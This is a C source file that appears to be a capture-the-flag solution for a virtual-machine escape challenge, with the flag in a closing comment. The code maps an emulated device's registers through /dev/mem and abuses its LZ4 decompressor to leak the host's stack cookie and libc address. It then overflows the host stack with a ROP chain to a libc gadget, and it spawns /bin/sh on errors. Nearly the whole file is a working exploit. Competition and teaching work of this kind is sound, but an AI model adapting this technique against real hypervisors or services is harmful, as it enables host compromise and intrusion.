#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/io.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <syscall.h>
#include <time.h>
#include <unistd.h>

static void __die_errno(const char *path, int line, const char *msg);

#define die_errno(msg) __die_errno(__FILE__, __LINE__, msg)

#define check_syscall(x)                                                       \
  ({                                                                           \
    typeof(x) __x = x;                                                         \
    if (__x == (typeof(x))-1) {                                                \
      die_errno(#x);                                                           \
    }                                                                          \
    __x;                                                                       \
  })

static void exec_shell(void) {
  char bin_sh[] = "/bin/sh";
  char *argv[] = {bin_sh, NULL};

  check_syscall(execve(argv[0], argv, environ));
}

static void __die_errno(const char *path, int line, const char *msg) {
  fprintf(stderr, "qmemo: %s:%d: ", path, line);
  perror(msg);
  exec_shell();
}

static void __die(const char *path, int line, const char *msg) {
  fprintf(stderr, "qmemo: %s:%d: %s\n", path, line, msg);
  exec_shell();
}

#define assert(x)                                                              \
  do {                                                                         \
    if (!(x)) {                                                                \
      __die(__FILE__, __LINE__, #x);                                           \
    }                                                                          \
  } while (0)

struct reg_mmio {
  uint64_t id;
  uint64_t len;
  uint64_t trigger;
  uint64_t pad_0x18;
  uint64_t buf[(0x1000 - 0x20) / sizeof(uint64_t)];
};

static void setup_4k_stack(volatile struct reg_mmio *mmio,
                           unsigned short offset) {
  mmio->buf[0] = (offset << 8) | 0x0f; /* copy:0, match:15+4   */
  mmio->buf[0] |= 0xffffffffff000000;  /* copy:0, match:1290+4 */
  mmio->buf[1] = -1;                   /* copy:0, match:3330+4 */
  mmio->buf[2] = 0xfcffff;             /* copy:0, match:4092+4 */
  mmio->len = 19;
}

static void leak_4k_stack(volatile struct reg_mmio *mmio,
                          unsigned short offset) {
  setup_4k_stack(mmio, offset);
  /*
   * lz4dec_x86_64() checks for completion after each copy,
   * so add a trailing zero byte
   */
  mmio->len++;
  mmio->trigger = 0;

  for (size_t i = 0; i < sizeof(mmio->buf) / sizeof(mmio->buf[0]); i++) {
    if (mmio->buf[i] != 0) {
      printf("[%d] 0x%" PRIx64 "\n", i, mmio->buf[i]);
    }
  }
}

static void assign_byte(uint8_t *buf, uint8_t val) {
  memcpy(buf, &val, sizeof(val));
}

static void overflow_stack(volatile struct reg_mmio *mmio, const void *buf,
                           size_t len) {
  setup_4k_stack(mmio, 0);
  assert(len >= 0x0f);
  uint8_t *mmio_buf = (uint8_t *)&mmio->buf;
  assign_byte(&mmio_buf[mmio->len++], 0xf0);
  assert((len - 0x0f) <= 0xff);
  assign_byte(&mmio_buf[mmio->len++], (len - 0x0f));
  memcpy(mmio_buf + mmio->len, buf, len);
  mmio->len += len;
  mmio->trigger = 0;
}

#define MMIO_BASE 0x0b000000

int main(void) {
  /* Start the conversation. */
  int fd = check_syscall(open("/dev/mem", O_RDWR | O_SYNC));
  volatile struct reg_mmio *mmio =
      check_syscall(mmap(NULL, sysconf(_SC_PAGESIZE), PROT_READ | PROT_WRITE,
                         MAP_SHARED, fd, MMIO_BASE));
  assert(mmio->id == 0xdeadbeef);

  leak_4k_stack(mmio, 0);
  uint64_t cookie = mmio->buf[317];
  assert(cookie == mmio->buf[335]);
  printf("cookie = 0x%" PRIx64 "\n", cookie);
  uint64_t libc = mmio->buf[171] - 0x69474;
  assert((libc & 0xfff) == 0);
  printf("libc = 0x%" PRIx64 "\n", libc);
  fflush(stdout);

  uint64_t rop[] = {
      /* 512 */ 0,
      /* 513 */ cookie,
      /* 514 */ 0,
      /* 515 */ 0,
      /* 516 */ 0,
      /* 517 */ libc + 0x583e3,
  };
  overflow_stack(mmio, rop, sizeof(rop));
  /* bwctf{Nice_you_escaped_without_the_help_of_Steve_mcQueen} */
}
